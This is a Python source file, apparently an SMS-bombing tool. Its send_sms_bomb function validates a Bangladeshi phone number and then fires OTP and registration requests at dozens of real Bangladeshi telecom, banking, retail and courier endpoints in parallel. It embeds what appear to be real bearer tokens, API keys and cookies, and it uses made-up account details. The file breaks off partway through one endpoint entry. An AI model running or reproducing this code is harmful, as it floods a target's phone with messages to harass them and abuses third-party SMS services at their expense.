import requests
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from datetime import datetime

def validate_bangladeshi_phone(phone):
    """Validate Bangladeshi phone number format"""
    pattern = r'^(?:\+?88)?01[3-9]\d{8}$'
    return bool(re.match(pattern, phone))

def clean_phone_number(phone):
    """Remove +88 or 88 prefix if present"""
    return re.sub(r'^\+?88', '', phone)

def make_request(request_data):
    """Make a single API request"""
    try:
        method = request_data.get('method', 'POST')
        headers = request_data.get('headers', {})
        body = request_data.get('body')
        
        if method.upper() == 'GET':
            response = requests.get(
                request_data['url'],
                headers=headers,
                timeout=10
            )
        else:
            response = requests.request(
                method,
                request_data['url'],
                headers=headers,
                data=body,
                timeout=10
            )
        
        return {
            'status': response.status_code,
            'response': response.text,
            'error': None
        }
    except Exception as e:
        return {
            'status': 0,
            'response': None,
            'error': str(e)
        }

def execute_parallel_requests(requests_dict):
    """Execute multiple requests in parallel"""
    results = {}
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_service = {
            executor.submit(make_request, request_data): service 
            for service, request_data in requests_dict.items()
        }
        
        for future in as_completed(future_to_service):
            service = future_to_service[future]
            try:
                results[service] = future.result()
            except Exception as e:
                results[service] = {
                    'status': 0,
                    'response': None,
                    'error': str(e)
                }
    
    return results

def send_sms_bomb(phone):
    """Main function to send SMS to all services"""
    
    # Validate phone number
    if not validate_bangladeshi_phone(phone):
        return {'error': 'Invalid Bangladeshi phone number format'}
    
    # Clean phone number
    clean_phone = clean_phone_number(phone)
    phone_with_bangladesh_code = '+88' + clean_phone
    
    # Prepare all API requests
    requests_dict = {}
    
    # From bomber1.js
    requests_dict['ali2bd'] = {
        'url': 'https://edge.ali2bd.com/api/consumer/v1/auth/login',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Origin': 'https://ali2bd.com',
            'Referer': 'https://ali2bd.com/',
            'Content-Type': 'application/json'
        },
        'body': json.dumps({'username': phone_with_bangladesh_code})
    }
    
    requests_dict['apex4u'] = {
        'url': 'https://api.apex4u.com/api/auth/login',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        },
        'body': json.dumps({'phoneNumber': clean_phone})
    }
    
    requests_dict['applink'] = {
        'url': 'https://applink.com.bd/appstore-v4-server/login/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Referer': 'https://applink.com.bd/',
            'Content-Type': 'application/json',
            'Origin': 'https://applink.com.bd'
        },
        'body': json.dumps({'msisdn': '88' + clean_phone})
    }
    
    requests_dict['banglalink'] = {
        'url': 'https://myblapi.banglalink.net/api/v1/send-otp',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json'
        },
        'body': json.dumps({'phone': clean_phone})
    }
    
    requests_dict['chokrojan'] = {
        'url': 'https://chokrojan.com/api/v1/passenger/login/mobile',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'domain-name': 'chokrojan.com',
            'user-platform': '3',
            'company-id': '1',
            'Origin': 'https://chokrojan.com',
            'Referer': 'https://chokrojan.com/login',
            'Cookie': '_ga_TXX7J24H07=GS1.1.1681140800.3.1.1681142406.0.0.0; _ga=GA1.1.162112941.1678173405; _fbp=fb.1.1678173407195.536316567',
            'Content-Type': 'application/json'
        },
        'body': json.dumps({'mobile_number': clean_phone})
    }
    
    requests_dict['mygp'] = {
        'url': f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{clean_phone}/',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json'
        }
    }
    
    requests_dict['chinaonline'] = {
        'url': f'https://chinaonlineapi.com/api/v1/get/otp?phone={clean_phone}',
        'method': 'GET',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'token': 'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219',
            'Origin': 'https://chinaonlinebd.com',
            'Referer': 'https://chinaonlinebd.com/'
        }
    }
    
    requests_dict['hishabee'] = {
        'url': 'https://app.hishabee.business/api/V2/number_check',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json'
        },
        'body': json.dumps({'mobile_number': clean_phone})
    }
    
    requests_dict['cineplex'] = {
        'url': 'https://cineplex-ticket-api.cineplexbd.com/api/v1/otp-resend',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json'
        },
        'body': json.dumps({'r_token': 'jycbgygsecsgcfhsgcvysegfgrr46rrgve4urv64iu6', 'msisdn': clean_phone})
    }
    
    requests_dict['ezybank'] = {
        'url': 'https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
        },
        'body': json.dumps({
            'AccessToken': '',
            'TrackingNo': '',
            'mobileNo': clean_phone,
            'otpSms': '',
            'product_id': '250',
            'requestChannel': 'MOB',
            'trackingStatus': 5
        })
    }
    
    requests_dict['deeptoplay'] = {
        'url': 'https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json'
        },
        'body': json.dumps({'number': clean_phone})
    }
    
    requests_dict['iqra-live'] = {
        'url': f'http://apibeta.iqra-live.com/api/v1/sent-otp/{clean_phone}',
        'method': 'GET'
    }
    
    requests_dict['mcbaffiliate'] = {
        'url': 'https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        'body': f'PhoneNumber={clean_phone}'
    }
    
    requests_dict['mithaibd'] = {
        'url': 'https://mithaibd.com/api/login/?lang_code=en&currency_code=BDT',
        'method': 'POST',
        'headers': {
            'user-agent': 'okhttp/4.2.2',
            'Authorization': 'Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==',
            'Content-Type': 'application/json'
        },
        'body': json.dumps({
            'company_id': '2',
            'password2': 'Rahu333@@',
            'currency_code': 'BDT',
            'user_type': 'C',
            'email': 'fuckyoubro@gmail.com',
            'g_id': '',
            'lang_code': 'en',
            'operating_system': 'Android',
            'otp_verify': False,
            'password1': 'Rahu333@@',
            'phone': clean_phone,
            'storefront_id': '5'
        })
    }
    
    # From bomber2.js
    requests_dict['easy'] = {
        'url': 'https://core.easy.com.bd/api/v1/registration',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Referer': 'https://easy.com.bd/',
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'name': 'Shahidul Islam',
            'email': 'uyrlhkgxqw@emergentvillage.org',
            'mobile': clean_phone,
            'password': 'boss#2022',
            'password_confirmation': 'boss#2022',
            'device_key': '9a28ae67c5704e1fcb50a8fc4ghjea4d'
        })
    }
    
    requests_dict['eonbazar'] = {
        'url': 'https://app.eonbazar.com/api/auth/register',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'mobile': clean_phone,
            'name': 'Karim Mia',
            'password': 'karim2023',
            'email': f'dghdj{clean_phone}dsgj@gmail.com'
        })
    }
    
    requests_dict['adpoke'] = {
        'url': f'http://68.183.88.91/adpoke/cnt/dot/nserve/bd/send/otp?msisdnprefix=880&msisdn={clean_phone}&token=1693254641407n62562185n33&l=',
        'method': 'GET',
        'headers': {
            'Referer': 'http://68.183.88.91/',
        }
    }
    
    requests_dict['grameenphone'] = {
        'url': 'https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'payment_mode': 'mobile_balance',
            'longevity': 7,
            'voice': 25,
            'data': 1536,
            'fourg': 0,
            'bioscope': 0,
            'sms': 0,
            'mca': 0,
            'msisdn': clean_phone,
            'price': 73.34,
            'bundle_id': 26571,
            'is_login': False
        })
    }
    
    requests_dict['flipper'] = {
        'url': 'https://portal.flipper.com.bd/api/v1/send-otp/login',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'X-Authorization': 'QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3',
            'Origin': 'https://flipper.com.bd',
            'Referer': 'https://flipper.com.bd/',
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'mobile_number': clean_phone
        })
    }
    
    requests_dict['freedom'] = {
        'url': 'https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0',
        },
        'body': json.dumps({
            'AccessToken': '',
            'TrackingNo': '',
            'mobileNo': clean_phone,
            'otpSms': '',
            'product_id': '122',
            'requestChannel': 'MOB',
            'trackingStatus': 5
        })
    }
    
    requests_dict['fundesh'] = {
        'url': 'https://fundesh.com.bd/api/auth/generateOTP?service_key=',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'msisdn': clean_phone
        })
    }
    
    requests_dict['ghoorilearning'] = {
        'url': 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json',
            'Referer': 'https://ghoorilearning.com/',
            'Origin': 'https://ghoorilearning.com',
        },
        'body': json.dumps({
            'mobile_no': clean_phone
        })
    }
    
    requests_dict['mygp2'] = {
        'url': f'https://api.mygp.cinematic.mobi/api/v1/otp/88{clean_phone}/SBENT_3GB7D',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'accessinfo': {
                'access_token': 'K165S6V6q4C6G7H0y9C4f5W7t5YeC6',
                'referenceCode': '20190827042622'
            }
        })
    }
    
    requests_dict['bkshopthc'] = {
        'url': 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36'
        },
        'body': json.dumps({
            'phone': clean_phone,
            'email': '',
            'language': 'en'
        })
    }
    
    requests_dict['weblogin'] = {
        'url': 'https://weblogin.grameenphone.com/backend/api/v1/otp',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'msisdn': clean_phone
        })
    }
    
    requests_dict['hishabee2'] = {
        'url': f'https://app.hishabee.business/api/V2/otp/send?mobile_number={clean_phone}',
        'method': 'GET',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json',
            'Content-Length': '0',
        }
    }
    
    # From bomber3.js
    requests_dict['bodyshop'] = {
        'url': 'https://www.thebodyshop.com.bd/smspro/customer/register/',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.thebodyshop.com.bd',
            'Referer': 'https://www.thebodyshop.com.bd/customer/account/create/',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'TE': 'trailers'
        },
        'body': f'mobile=88{clean_phone}'
    }
    
    requests_dict['kepler'] = {
        'url': 'https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'deviceId': '7dtdhid45c0f0901',
            'deviceInfo': {
                'deviceInfoSignature': 'D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA',
                'deviceId': '7d8b0agi0g0f0901',
                'firebaseDeviceToken': '',
                'manufacturer': 'MI',
                'modelName': 'NOTE 10',
                'osFirmWireBuild': '',
                'osName': 'Android',
                'osVersion': '10',
                'rootDevice': 0
            },
            'operator': 'Gp',
            'walletNumber': clean_phone
        })
    }
    
    requests_dict['sundar'] = {
        'url': 'https://api-gateway.sundarbancourierltd.com/graphql',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'Host': 'api-gateway.sundarbancourierltd.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://customer.sundarbancourierltd.com/',
            'Origin': 'https://customer.sundarbancourierltd.com',
            'Content-Length': '0'
        },
        'body': json.dumps({
            'operationName': 'CreateAccessToken',
            'variables': {
                'accessTokenFilter': {
                    'userName': clean_phone
                }
            },
            'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }'
        })
    }
    
    requests_dict['shomvob'] = {
        'url': 'https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Content-Type': 'application/json',
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s'
        },
        'body': json.dumps({
            'phone': clean_phone
        })
    }
    
    requests_dict['skitto'] = {
        'url': f'https://www.skitto.com/replace-sim/sent-otp/{clean_phone}',
        'method': 'GET',
        'headers': {
            'Content-Type': 'application/json'
        }
    }
    
    requests_dict['shikho'] = {
        'url': 'https://api.shikho.com/auth/v2/send/sms',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'phone': clean_phone,
            'type': 'student',
            'auth_type': 'signup',
            'vendor': 'shikho'
        })
    }
    
    requests_dict['sinorBeauty'] = {
        'url': 'https://www.sinorbeauty.com/ajax',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13',
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        'body': f'sendVerifyOtp={clean_phone}'
    }
    
    requests_dict['sheba'] = {
        'url': 'https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD',
        'method': 'GET',
        'headers': {
            'Content-Type': 'application/json',
        }
    }
    
    requests_dict['robi'] = {
        'url': 'https://webapi.robi.com.bd/v1/send-otp',
        'method': 'POST',
        'headers': {
            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc',
            'Content-Type': 'application/json',
        },
        'body': json.dumps({
            'phone_number': clean_phone,
            'type': 'doorstep'
        })
    }
    
    requests_dict['circle'] = {
        'url': 'https://reseller.circle.com.bd/api/v2/auth/signup',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)'
        },
        'body': json.dumps({
            'name': '+88' + clean_phone,
            'email_or_phone': '+88' + clean_phone,
            'password': '123456',
            'password_confirmation': '123456',
            'register_by': 'phone'
        })
    }
    
    # From bomber4.js
    requests_dict['lazzPharma'] = {
        'url': 'https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister',
        'method': 'POST',
        'headers': {
            'Host': 'www.lazzpharma.com',
            'Access-Control-Allow-Origin': '*',
            'Sec-CH-UA': '"Not A(Brand";v="8", "Chromium";v="132"',
            'Content-Type': 'application/json',
            'Sec-CH-UA-Mobile': '?1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
            'Sec-CH-UA-Platform': '"Android"',
            'Accept': '*/*',
            'Origin': 'https://www.lazzpharma.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.lazzpharma.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        'body': json.dumps({
            'ActivityId': 'a8d63674-a00d-4c6d-9be0-4f60b70ec194',
            'Phone': clean_phone
        })
    }
    
    requests_dict['shwapno'] = {
        'url': 'https://store-api.shwapno.com/en/api/customer/login',
        'method': 'POST',
        'headers': {
            'User-Agent': 'shwapno.flutter',
            'Accept-Encoding': 'gzip',
            'NST': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
            'Client-Type': 'App',
            'Host': 'store-api.shwapno.com',
            'Content-Type': 'application/json',
            'Customer': 'f7f1ffa2-1200-48e5-9434-b55da46a8981',
            'Device-Type': 'Mobile',
            'AppDeviceToken': 'f7f1ffa2-1200-48e5-9434-b55da46a8981'
        },
        'body': json.dumps({
            'phoneNumber': clean_phone
        })
    }
    
    requests_dict['badhan'] = {
        'url': 'https://badhan-api.stylezworld.net/api/otp/store',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Dart/3.1 (dart:io)',
            'access-control-allow-credentials': 'true',
            'access-control-allow-headers': 'Origin,Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,locale',
            'Accept': 'application/json',
            'access-control-allow-origin': '*',
            'access-control-allow-methods': 'POST, OPTIONS',
            'Accept-Encoding': 'gzip',
            'app-access-token': 'mWR+64IbKwxM2XCyJbMvUSCcc=',
            'Content-Type': 'application/json; charset=utf-8'
        },
        'body': json.dumps({
            'phone_number': clean_phone
        })
    }
    
    # From bomber5.js and bomber6.js
    requests_dict['meena'] = {
        'url': 'https://easybill.zatiq.tech/api/auth/v1/send_otp',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'application-type': 'Merchant',
            'content-type': 'application/json',
            'device-type': 'Web',
            'origin': 'https://merchant.zatiqeasy.com',
            'priority': 'u=1, i',
            'referer': 'https://merchant.zatiqeasy.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'code': '+880',
            'country_code': 'BD',
            'phone': clean_phone,
            'is_existing_user': False
        })
    }
    
    requests_dict['motion'] = {
        'url': 'https://api.motionview.com.bd/api/send-otp-phone-signup',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://motionview.com.bd',
            'referer': 'https://motionview.com.bd/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site'
        },
        'body': json.dumps({
            'phone': clean_phone
        })
    }
    
    requests_dict['paperfly'] = {
        'url': 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/json',
            'device_identifier': 'undefined',
            'device_name': 'undefined',
            'origin': 'https://go.paperfly.com.bd',
            'priority': 'u=1, i',
            'referer': 'https://go.paperfly.com.bd/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'full_name': 'Adil rashid',
            'company_name': 'Abu rahim',
            'email_address': 'webhosttcs@gmail.com',
            'phone_number': clean_phone
        })
    }
    
    requests_dict['rabbit'] = {
        'url': 'https://apix.rabbitholebd.com/appv2/login/requestOTP',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/json',
            'current-time': '1744902669',
            'hash': '383690c27042ef63429357d9e82fd7846266075567c3017f5e3da4345e7b3a56',
            'origin': 'https://www.rabbitholebd.com',
            'priority': 'u=1, i',
            'referer': 'https://www.rabbitholebd.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'mobile': '+88' + clean_phone
        })
    }
    
    requests_dict['sikho'] = {
        'url': 'https://api.shikho.com/auth/v2/send/sms',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.shikho.com',
            'priority': 'u=1, i',
            'referer': 'https://www.shikho.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'phone': '880' + clean_phone.lstrip('0'),
            'type': 'student',
            'auth_type': 'signup',
            'vendor': 'shikho'
        })
    }
    
    requests_dict['swap'] = {
        'url': 'https://api.swap.com.bd/api/v1/send-otp/v2',
        'method': 'POST',
        'headers': {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://swap.com.bd',
            'Referer': 'https://swap.com.bd/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'signature': '9d5cgzPGfnrKujXhtbho7vljOG+MxantzkvRUrUJCpY='
        },
        'body': json.dumps({
            'phone': clean_phone
        })
    }
    
    requests_dict['red'] = {
        'url': 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        'method': 'POST',
        'headers': {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://redx.com.bd',
            'priority': 'u=1, i',
            'referer': 'https://redx.com.bd/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'Cookie': '_ga_DVN5RVT5NY=GS1.1.1744905912.1.0.1744905912.60.0.0; _ga=GA1.1.1205938136.1744905913; _fbp=fb.2.1744905912788.67493150317867107; _ga_ZTN98XM7BX=GS1.1.1744905913.1.0.1744905913.60.0.0'
        },
        'body': json.dumps({
            'phoneNumber': clean_phone
        })
    }
    
    requests_dict['toffe'] = {
        'url': 'https://prod-services.toffeelive.com/sms/v1/subscriber/otp',
        'method': 'POST',
        'headers': {
            'accept': '*/*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'authorization': 'Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL3RvZmZlZWxpdmUuY29tIiwiY291bnRyeSI6IkJEIiwiZF9pZCI6ImI3ZmMxYTMwLWY4YWEtNDcxMS04NjlkLTdiODE0NDI1YmY5NyIsImV4cCI6MTc0NDkyMzQ2NywiaWF0IjoxNzQ0OTAxODY3LCJpc3MiOiJ0b2ZmZWVsaXZlLmNvbSIsImp0aSI6Ijk2NDhmMzQwLWU0NGItNDM2My04NTIxLTEwOTcwMGQyNjg3Nl8xNzQ0OTAxODY3IiwicHJvdmlkZXIiOiJ0b2ZmZWUiLCJyX2lkIjoiYjdmYzFhMzAtZjhhYS00NzExLTg2OWQtN2I4MTQ0MjViZjk3Iiwic19pZCI6ImI3ZmMxYTMwLWY4YWEtNDcxMS04NjlkLTdiODE0NDI1YmY5NyIsInRva2VuIjoiYWNjZXNzIiwidHlwZSI6ImRldmljZSJ9.nvocuo1f4wXtUETxW2kMFey3Gccv4c5_2HFJsiK8dG_duqcGwYEzY3xm79IzzTECN_0cXK8PqCfZ7RlDz1bLdQ',
            'cache-control': 'max-age=0',
            'content-type': 'application/json',
            'origin': 'https://toffeelive.com',
            'priority': 'u=1, i',
            'referer': 'https://toffeelive.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        },
        'body': json.dumps({
            'target': '880' + clean_phone.lstrip('0'),
            'resend': False
        })
    }
    
    requests_dict['walton'] = {
        'url': 'https://waltonplaza.com.bd/api/auth/otp/create',
        'method': 'POST',
        'headers': {
            'accept': '*/*',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://waltonplaza.com.bd',
            'priority': 'u=1, i',
            'referer': 'https://waltonplaza.com.bd/auth/phone-login',
